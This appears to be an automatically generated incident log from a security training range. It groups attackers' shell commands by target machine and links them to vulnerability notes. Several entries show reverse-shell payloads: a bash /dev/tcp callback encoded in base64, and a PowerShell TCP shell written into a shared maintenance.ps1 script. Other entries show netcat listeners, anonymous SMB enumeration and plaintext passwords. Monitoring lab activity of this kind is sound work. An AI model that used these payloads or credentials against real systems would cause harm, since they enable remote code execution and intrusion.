- Entries:
  - 2026-02-09T18:51:43 | logs/10.100.7.14/shell_history.csv#L476 | smbmap -H 10.100.7.42 -u " -p "
  - 2026-02-09T18:51:59 | logs/10.100.7.14/shell_history.csv#L477 | smbmap -H 10.100.7.42 -u guest" -p "
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 627 - 2026-02-09T18:58:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T18:58:07 | logs/10.100.7.14/shell_history.csv#L485 | smbclient //10.100.7.42/share --user orbital
  - 2026-02-09T18:58:11 | logs/10.100.7.14/shell_history.csv#L486 | smbclient //10.100.7.42/share --user orbital
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 628 - 2026-02-09T19:07:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:07:41 | logs/10.100.7.32/shell_history.csv#L1057 | exit
  - 2026-02-09T19:07:42 | logs/10.100.7.32/shell_history.csv#L1058 | ls
  - 2026-02-09T19:07:44 | logs/10.100.7.32/shell_history.csv#L1059 | cd /tmp

## Incident 629 - 2026-02-09T19:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T19:20:13 | logs/10.100.7.32/shell_history.csv#L1060 | python3 penelope.py
  - 2026-02-09T19:20:17 | logs/10.100.7.32/shell_history.csv#L1061 | cat ~/.ssh/helios_ssh_key.pub

## Incident 630 - 2026-02-09T20:03:00
- Target IP: 10.100.7.47
- Target Box: crucible
- Entries:
  - 2026-02-09T20:03:48 | logs/10.100.7.32/shell_history.csv#L1072 | ssh -i ~/.ssh/helios_ssh_key crucible@10.100.7.47
  - 2026-02-09T20:03:50 | logs/10.100.7.32/shell_history.csv#L1073 | ssh -i ~/.ssh/helios_ssh_key crucible@10.100.7.47

## Incident 631 - 2026-02-09T20:03:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-02-09T20:03:51 | logs/10.100.7.32/shell_history.csv#L1074 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.44
  - 2026-02-09T20:03:53 | logs/10.100.7.32/shell_history.csv#L1076 | ssh forge@10.100.7.44
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 632 - 2026-02-10T18:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T18:39:19 | logs/10.100.7.32/shell_history.csv#L1079 | exit
  - 2026-02-10T18:39:20 | logs/10.100.7.32/shell_history.csv#L1080 | clear
  - 2026-02-10T18:39:21 | logs/10.100.7.32/shell_history.csv#L1081 | ls

## Incident 633 - 2026-02-10T18:41:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T18:41:20 | logs/10.100.7.32/shell_history.csv#L1084 | exit
  - 2026-02-10T18:41:29 | logs/10.100.7.32/shell_history.csv#L1085 | exit

## Incident 634 - 2026-02-10T18:41:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T18:41:10 | logs/10.100.7.14/shell_history.csv#L524 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:41:23 | logs/10.100.7.14/shell_history.csv#L525 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:41:33 | logs/10.100.7.14/shell_history.csv#L526 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
  - 2026-02-10T18:41:47 | logs/10.100.7.14/shell_history.csv#L527 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 635 - 2026-02-10T19:44:00
- Target IP: 10.100.7.47
- Target Box: crucible
- Entries:
  - 2026-02-10T19:44:24 | logs/10.100.7.32/shell_history.csv#L1095 | scp -i ~/.ssh/helios_ssh_key crucible@10.100.7.47:/opt/chatbot/main ./crucible_chatbot.c
  - 2026-02-10T19:44:31 | logs/10.100.7.32/shell_history.csv#L1096 | scp -i ~/.ssh/helios_ssh_key crucible@10.100.7.47:/opt/chatbot/chatbot ./crucible_chatbot

## Incident 636 - 2026-02-10T19:44:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T19:44:32 | logs/10.100.7.32/shell_history.csv#L1097 | ls
  - 2026-02-10T19:44:41 | logs/10.100.7.32/shell_history.csv#L1098 | checksec
  - 2026-02-10T19:44:57 | logs/10.100.7.32/shell_history.csv#L1099 | sudo apt install checksec

## Incident 637 - 2026-02-10T19:45:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:45:40 | logs/10.100.7.14/shell_history.csv#L602 | mysql -h 10.100.7.48 -P 3306 -u inspire
  - 2026-02-10T19:45:50 | logs/10.100.7.14/shell_history.csv#L603 | mysql -h 10.100.7.48 -P 3306 -u inspire
  - 2026-02-10T19:45:10 | logs/10.100.7.12/shell_history.csv#L344 | mysql -u inspire -h 10.100.7.48 -p --skip-ssl
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 638 - 2026-02-13T23:30:00
- Target IP: 10.100.7.47
- Target Box: crucible
- Entries:
  - 2026-02-13T23:30:59 | logs/10.100.7.32/shell_history.csv#L1101 | ssh -i ~/.ssh/helios_ssh_key crucible@10.100.7.47
  - 2026-02-13T23:30:59 | logs/10.100.7.32/shell_history.csv#L1102 | ssh -i ~/.ssh/helios_ssh_key crucible@10.100.7.47

## Incident 639 - 2026-01-08T18:53:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T18:53:43 | logs/10.100.7.14/shell_history.csv#L1 | exit
  - 2026-01-08T18:53:52 | logs/10.100.7.13/shell_history.csv#L1 | exit

## Incident 640 - 2026-01-08T18:54:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T18:54:09 | logs/10.100.7.14/shell_history.csv#L2 | cat .full_research_history.csv
  - 2026-01-08T18:54:06 | logs/10.100.7.13/shell_history.csv#L2 | cat .full_research_history.csv

## Incident 641 - 2026-01-08T18:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T18:55:59 | logs/10.100.7.14/shell_history.csv#L3 | sudo bash
  - 2026-01-08T18:55:50 | logs/10.100.7.13/shell_history.csv#L3 | sudo bash
  - 2026-01-08T18:55:57 | logs/10.100.7.13/shell_history.csv#L4 | sudo bash

## Incident 642 - 2026-01-12T19:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:20:14 | logs/10.100.7.14/shell_history.csv#L15 | exit
  - 2026-01-12T19:20:18 | logs/10.100.7.13/shell_history.csv#L20 | cd ../../..
  - 2026-01-12T19:20:24 | logs/10.100.7.13/shell_history.csv#L21 | ls
  - 2026-01-12T19:20:32 | logs/10.100.7.13/shell_history.csv#L22 | cd home

## Incident 643 - 2026-01-13T18:59:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:59:23 | logs/10.100.7.14/shell_history.csv#L36 | tldr hydra
  - 2026-01-13T18:59:38 | logs/10.100.7.14/shell_history.csv#L37 | tldr --update
  - 2026-01-13T18:59:42 | logs/10.100.7.14/shell_history.csv#L38 | tldr hydra

## Incident 644 - 2026-01-13T20:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:20:10 | logs/10.100.7.14/shell_history.csv#L59 | exit
  - 2026-01-13T20:20:27 | logs/10.100.7.14/shell_history.csv#L60 | ncat -l -p 1337
  - 2026-01-13T20:20:02 | logs/10.100.7.13/shell_history.csv#L83 | ls
  - 2026-01-13T20:20:41 | logs/10.100.7.13/shell_history.csv#L84 | cat readme.txt
  - 2026-01-13T20:20:49 | logs/10.100.7.13/shell_history.csv#L85 | readme.txt

## Incident 645 - 2026-01-16T14:35:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-16T14:35:07 | logs/10.100.7.14/shell_history.csv#L65 | nc -vv -l -p 8888
  - 2026-01-16T14:35:09 | logs/10.100.7.14/shell_history.csv#L66 | nc -vv -l -p 8888

## Incident 646 - 2026-01-16T14:40:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-16T14:40:46 | logs/10.100.7.14/shell_history.csv#L67 | nmap 10.100.7.43
  - 2026-01-16T14:40:55 | logs/10.100.7.14/shell_history.csv#L68 | nmap 10.100.7.43

## Incident 647 - 2026-01-16T14:58:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-16T14:58:26 | logs/10.100.7.14/shell_history.csv#L80 | gunzip backup.zip
  - 2026-01-16T14:58:40 | logs/10.100.7.14/shell_history.csv#L81 | tldr gunzip
  - 2026-01-16T14:58:53 | logs/10.100.7.14/shell_history.csv#L82 | tldr gzip

## Incident 648 - 2026-01-16T14:59:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-16T14:59:22 | logs/10.100.7.14/shell_history.csv#L83 | gzip backup.zip
  - 2026-01-16T14:59:34 | logs/10.100.7.14/shell_history.csv#L84 | unzip backup.zip
  - 2026-01-16T14:59:48 | logs/10.100.7.14/shell_history.csv#L85 | unzip backup
  - 2026-01-16T14:59:54 | logs/10.100.7.14/shell_history.csv#L86 | ls

## Incident 649 - 2026-01-16T15:00:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-16T15:00:05 | logs/10.100.7.14/shell_history.csv#L87 | cd downloads
  - 2026-01-16T15:00:12 | logs/10.100.7.14/shell_history.csv#L88 | cd Downloads
  - 2026-01-16T15:00:15 | logs/10.100.7.14/shell_history.csv#L89 | ls
  - 2026-01-16T15:00:22 | logs/10.100.7.14/shell_history.csv#L90 | cd ..
  - 2026-01-16T15:00:54 | logs/10.100.7.14/shell_history.csv#L92 | unzip backup

## Incident 650 - 2026-01-16T15:06:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-16T15:06:16 | logs/10.100.7.14/shell_history.csv#L96 | xfreerdp3
  - 2026-01-16T15:06:25 | logs/10.100.7.14/shell_history.csv#L97 | tldr xfreerdp3

## Incident 651 - 2026-01-16T15:08:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-16T15:08:18 | logs/10.100.7.14/shell_history.csv#L99 | smbclient //10.100.7.41/public  --user guest
  - 2026-01-16T15:08:57 | logs/10.100.7.14/shell_history.csv#L100 | nxc smb 10.100.7.41

## Incident 652 - 2026-01-16T15:09:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-16T15:09:41 | logs/10.100.7.14/shell_history.csv#L101 | nxc smb 10.100.7.41 -u guest -p''
  - 2026-01-16T15:09:53 | logs/10.100.7.14/shell_history.csv#L102 | nxc smb 10.100.7.41 -u guest -p ''

## Incident 653 - 2026-01-16T15:22:00
- Target IP: 10.100.7.14
- Target Box: None
- Entries:
  - 2026-01-16T15:22:24 | logs/10.100.7.14/shell_history.csv#L104 | echo 'sh -i >& /dev/tcp/10.100.7.14/4444 0>&1'
  - 2026-01-16T15:22:32 | logs/10.100.7.14/shell_history.csv#L105 | echo 'sh -i >& /dev/tcp/10.100.7.14/4444 0>&1' | base64
  - 2026-01-16T15:22:42 | logs/10.100.7.14/shell_history.csv#L106 | echo 'sh -i >& /dev/tcp/10.100.7.14/4444 0>&1' | base64

## Incident 654 - 2026-01-20T19:09:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-20T19:09:39 | logs/10.100.7.22/shell_history.csv#L87 | solaris@10.100.7.40
  - 2026-01-20T19:09:49 | logs/10.100.7.22/shell_history.csv#L88 | ssh solaris@10.100.7.40

## Incident 655 - 2026-01-20T19:11:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:11:04 | logs/10.100.7.14/shell_history.csv#L111 | sshkey-gen
  - 2026-01-20T19:11:11 | logs/10.100.7.14/shell_history.csv#L112 | ssh key-gen
  - 2026-01-20T19:11:35 | logs/10.100.7.14/shell_history.csv#L113 | ssh-keygen
  - 2026-01-20T19:11:12 | logs/10.100.7.22/shell_history.csv#L90 | ls
  - 2026-01-20T19:11:31 | logs/10.100.7.22/shell_history.csv#L91 | ls
  - 2026-01-20T19:11:43 | logs/10.100.7.22/shell_history.csv#L92 | cd ~
  - 2026-01-20T19:11:44 | logs/10.100.7.22/shell_history.csv#L93 | ls

## Incident 656 - 2026-01-20T19:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:19:02 | logs/10.100.7.14/shell_history.csv#L124 | cd file.txt
  - 2026-01-20T19:19:05 | logs/10.100.7.14/shell_history.csv#L125 | cat file.txt
  - 2026-01-20T19:19:24 | logs/10.100.7.22/shell_history.csv#L107 | eval $(ssh-agent -s)

## Incident 657 - 2026-01-20T19:19:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:19:32 | logs/10.100.7.14/shell_history.csv#L126 | ssh -i file.txt starfall@10.100.7.43
  - 2026-01-20T19:19:32 | logs/10.100.7.14/shell_history.csv#L127 | ssh -i file.txt starfall@10.100.7.43

## Incident 658 - 2026-01-20T19:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:26:00 | logs/10.100.7.14/shell_history.csv#L136 | cat file1.txt
  - 2026-01-20T19:26:57 | logs/10.100.7.14/shell_history.csv#L138 | ssh -i file1.txt starfall@100.100.7.43

## Incident 659 - 2026-01-20T19:29:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:29:32 | logs/10.100.7.14/shell_history.csv#L142 | ssh -i file1.txt starfall@10.100.7.43
  - 2026-01-20T19:29:48 | logs/10.100.7.14/shell_history.csv#L143 | ssh starfall@10.100.7.43

## Incident 660 - 2026-01-20T19:31:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:31:03 | logs/10.100.7.14/shell_history.csv#L145 | ssh -i file1.txt starfall@10.100.7.43
  - 2026-01-20T19:31:04 | logs/10.100.7.14/shell_history.csv#L146 | ssh -i file1.txt starfall@10.100.7.43
  - 2026-01-20T19:31:54 | logs/10.100.7.14/shell_history.csv#L147 | ssh -i file1.txt starfall@10.100.7.43
  - 2026-01-20T19:31:55 | logs/10.100.7.14/shell_history.csv#L148 | ssh -i file1.txt starfall@10.100.7.43

## Incident 661 - 2026-01-20T19:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:32:04 | logs/10.100.7.14/shell_history.csv#L149 | cat file1
  - 2026-01-20T19:32:08 | logs/10.100.7.14/shell_history.csv#L150 | cat file1.txt
  - 2026-01-20T19:32:16 | logs/10.100.7.14/shell_history.csv#L151 | cat file1.txt.pub
  - 2026-01-20T19:32:05 | logs/10.100.7.22/shell_history.csv#L116 | cd ~
  - 2026-01-20T19:32:07 | logs/10.100.7.22/shell_history.csv#L117 | ls
  - 2026-01-20T19:32:22 | logs/10.100.7.22/shell_history.csv#L118 | mkdir cve6387

## Incident 662 - 2026-01-20T19:36:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:36:11 | logs/10.100.7.22/shell_history.csv#L124 | vim Makefile
  - 2026-01-20T19:36:21 | logs/10.100.7.22/shell_history.csv#L125 | make all

## Incident 663 - 2026-01-26T18:59:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:59:00 | logs/10.100.7.14/shell_history.csv#L223 | exit
  - 2026-01-26T18:59:25 | logs/10.100.7.14/shell_history.csv#L225 | cat hash.txt
  - 2026-01-26T18:59:27 | logs/10.100.7.14/shell_history.csv#L226 | ls
  - 2026-01-26T18:59:31 | logs/10.100.7.14/shell_history.csv#L227 | cat hashes.txt
  - 2026-01-26T18:59:59 | logs/10.100.7.14/shell_history.csv#L228 | cat hashes.txt
  - 2026-01-26T18:59:59 | logs/10.100.7.14/shell_history.csv#L229 | cat hashes.txt
  - 2026-01-26T18:59:59 | logs/10.100.7.14/shell_history.csv#L230 | cat hashes.txt
  - 2026-01-26T18:59:11 | logs/10.100.7.24/shell_history.csv#L107 | nmap -sV -p 1-65535 -T3 45.33.32.156

## Incident 664 - 2026-01-26T19:00:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-26T19:00:43 | logs/10.100.7.14/shell_history.csv#L231 | ssh guest@10.100.7.42
  - 2026-01-26T19:00:53 | logs/10.100.7.14/shell_history.csv#L232 | namp 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 665 - 2026-01-26T19:11:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:11:15 | logs/10.100.7.14/shell_history.csv#L239 | nmap 10.100.7.46
  - 2026-01-26T19:11:48 | logs/10.100.7.14/shell_history.csv#L240 | nxc smb 10.100.7.46 -u guest -p ' '
  - 2026-01-26T19:11:41 | logs/10.100.7.24/shell_history.csv#L125 | smbclient -L //10.100.7.46 -U “”
  - 2026-01-26T19:11:58 | logs/10.100.7.24/shell_history.csv#L126 | smbclient //10.100.7.46/C -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 666 - 2026-01-26T19:12:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:12:03 | logs/10.100.7.14/shell_history.csv#L241 | nxc smb 10.100.7.46
  - 2026-01-26T19:12:51 | logs/10.100.7.24/shell_history.csv#L127 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 667 - 2026-01-26T19:14:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:14:15 | logs/10.100.7.24/shell_history.csv#L132 | vim healthcheck.ps1
  - 2026-01-26T19:14:30 | logs/10.100.7.24/shell_history.csv#L133 | vim maintenance.

## Incident 668 - 2026-01-26T19:27:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:27:19 | logs/10.100.7.14/shell_history.csv#L243 | nxc smb 10.100.7.46 -u guest -p 'fdfdasdf'
  - 2026-01-26T19:27:52 | logs/10.100.7.14/shell_history.csv#L244 | nxc smb 10.100.7.46 -u ''  -p ''
  - 2026-01-26T19:27:40 | logs/10.100.7.24/shell_history.csv#L161 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-26T19:27:46 | logs/10.100.7.24/shell_history.csv#L162 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 669 - 2026-01-26T19:29:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:29:09 | logs/10.100.7.14/shell_history.csv#L246 | nxc smb 10.100.7.46 -u guest  -p '' --shares
  - 2026-01-26T19:29:45 | logs/10.100.7.24/shell_history.csv#L165 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
  - 2026-01-26T19:29:51 | logs/10.100.7.24/shell_history.csv#L166 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 670 - 2026-01-26T19:29:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:29:05 | logs/10.100.7.13/shell_history.csv#L117 | sudo apt install golang-go
  - 2026-01-26T19:29:37 | logs/10.100.7.13/shell_history.csv#L119 | sudo apt install goop
  - 2026-01-26T19:29:37 | logs/10.100.7.24/shell_history.csv#L164 | exit

## Incident 671 - 2026-01-26T19:30:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:30:48 | logs/10.100.7.14/shell_history.csv#L247 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-26T19:30:30 | logs/10.100.7.24/shell_history.csv#L167 | nmap -sV -p- -T3 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 672 - 2026-01-26T19:30:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:30:53 | logs/10.100.7.14/shell_history.csv#L248 | cat maintenance.ps1
  - 2026-01-26T19:30:20 | logs/10.100.7.13/shell_history.csv#L120 | sudo apt install goop

## Incident 673 - 2026-01-26T19:43:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:43:38 | logs/10.100.7.14/shell_history.csv#L251 | $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() >> file20.txt"
  - 2026-01-26T19:43:16 | logs/10.100.7.13/shell_history.csv#L173 | cd ~/git_info/forge-logs.git
  - 2026-01-26T19:43:17 | logs/10.100.7.13/shell_history.csv#L174 | ls
  - 2026-01-26T19:43:23 | logs/10.100.7.13/shell_history.csv#L175 | cat packed-refs
  - 2026-01-26T19:43:48 | logs/10.100.7.13/shell_history.csv#L176 | cat HEAD

## Incident 674 - 2026-01-26T19:43:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:43:05 | logs/10.100.7.24/shell_history.csv#L196 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-26T19:43:13 | logs/10.100.7.24/shell_history.csv#L197 | smbclient -L //10.100.7.46 -U “”
  - 2026-01-26T19:43:26 | logs/10.100.7.24/shell_history.csv#L198 | smbclient //10.100.7.46/C$ -U “”
  - 2026-01-26T19:43:34 | logs/10.100.7.24/shell_history.csv#L199 | smbclient //10.100.7.46/ADMIN$ -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 675 - unknown
- Target IP: None
- Target Box: None
- Entries:
  - no-ts | logs/10.100.7.14/shell_history.csv#L254 | $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()" >> file20.txt
  - no-ts | logs/10.100.7.14/shell_history.csv#L256 | $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()' > file20.txt"
  - no-ts | logs/10.100.7.12/shell_history.csv#L63 | ^[[200~sqlmap -u http://target/app.php?id=1" -D shop_db --tables"

## Incident 676 - 2026-01-26T19:51:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:51:09 | logs/10.100.7.14/shell_history.csv#L264 | nc -lvnp 4444
  - 2026-01-26T19:51:33 | logs/10.100.7.14/shell_history.csv#L265 | $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()' > maintenance.ps1"
  - 2026-01-26T19:51:39 | logs/10.100.7.14/shell_history.csv#L266 | cat maintenance.ps1

## Incident 677 - 2026-01-26T19:52:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:52:02 | logs/10.100.7.13/shell_history.csv#L188 | git checkout 7eb86abd35407250c6468b51c0537dc528f2dc1d
  - 2026-01-26T19:52:16 | logs/10.100.7.13/shell_history.csv#L189 | cd ..
  - 2026-01-26T19:52:29 | logs/10.100.7.13/shell_history.csv#L190 | cd git_info
  - 2026-01-26T19:52:31 | logs/10.100.7.13/shell_history.csv#L191 | cd ..
  - 2026-01-26T19:52:39 | logs/10.100.7.13/shell_history.csv#L192 | git checkout 7eb86abd35407250c6468b51c0537dc528f2dc1d
  - 2026-01-26T19:52:45 | logs/10.100.7.13/shell_history.csv#L193 | cd ..
  - 2026-01-26T19:52:47 | logs/10.100.7.13/shell_history.csv#L194 | ls

## Incident 678 - 2026-01-26T19:53:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:53:36 | logs/10.100.7.14/shell_history.csv#L268 | exit
  - 2026-01-26T19:53:04 | logs/10.100.7.13/shell_history.csv#L195 | mkdir abc
  - 2026-01-26T19:53:07 | logs/10.100.7.13/shell_history.csv#L196 | cd abc

## Incident 679 - 2026-01-26T19:55:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:55:02 | logs/10.100.7.14/shell_history.csv#L269 | nmap 10.100.7.46
  - 2026-01-26T19:55:22 | logs/10.100.7.14/shell_history.csv#L270 | nxc smb 10.100.7.46  -u guest -p ‘‘
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 680 - 2026-01-26T19:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:55:02 | logs/10.100.7.13/shell_history.csv#L201 | git checkout 7eb86abd35407250c6468b51c0537dc528f2dc1d
  - 2026-01-26T19:55:40 | logs/10.100.7.13/shell_history.csv#L202 | git ls-files --others --exclude-from=.git/info/exclude
  - 2026-01-26T19:55:49 | logs/10.100.7.13/shell_history.csv#L203 | ls
  - 2026-01-26T19:55:55 | logs/10.100.7.13/shell_history.csv#L204 | cd logs
  - 2026-01-26T19:55:58 | logs/10.100.7.13/shell_history.csv#L205 | ls

## Incident 681 - 2026-01-26T19:56:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:56:39 | logs/10.100.7.14/shell_history.csv#L271 | nc -lvnp 4444
  - 2026-01-26T19:56:06 | logs/10.100.7.13/shell_history.csv#L206 | cat maintenance.log
  - 2026-01-26T19:56:16 | logs/10.100.7.13/shell_history.csv#L207 | cat production.log
  - 2026-01-26T19:56:32 | logs/10.100.7.13/shell_history.csv#L208 | cat quality.log
  - 2026-01-26T19:56:51 | logs/10.100.7.13/shell_history.csv#L209 | cd .
  - 2026-01-26T19:56:29 | logs/10.100.7.24/shell_history.csv#L201 | ^[[200~# Install gobuster
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L202 | go install github.com/OJ/gobuster/v3@latest
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L203 | go install github.com/OJ/gobuster/v3@latest
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L204 | # Basic directory enumeration
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L205 | gobuster dir -u https://example.com -w /path/to/wordlist.txt
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L206 | gobuster dir -u https://example.com -w /path/to/wordlist.txt
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L207 | # DNS subdomain enumeration
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L208 | gobuster dns -do example.com -w /path/to/wordlist.txt
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L209 | gobuster dns -do example.com -w /path/to/wordlist.txt
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L210 | # Virtual host discovery
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L211 | gobuster vhost -u https://example.com -w /path/to/wordlist.txt
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L212 | gobuster vhost -u https://example.com -w /path/to/wordlist.txt
  - 2026-01-26T19:56:30 | logs/10.100.7.24/shell_history.csv#L213 | # S3 bucket enumeration
  - 2026-01-26T19:56:48 | logs/10.100.7.24/shell_history.csv#L214 | go install github.com/OJ/gobuster/v3@latest

## Incident 682 - 2026-01-26T19:57:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:57:12 | logs/10.100.7.14/shell_history.csv#L272 | smbclient //10.100.7.46/Scripts --user guest
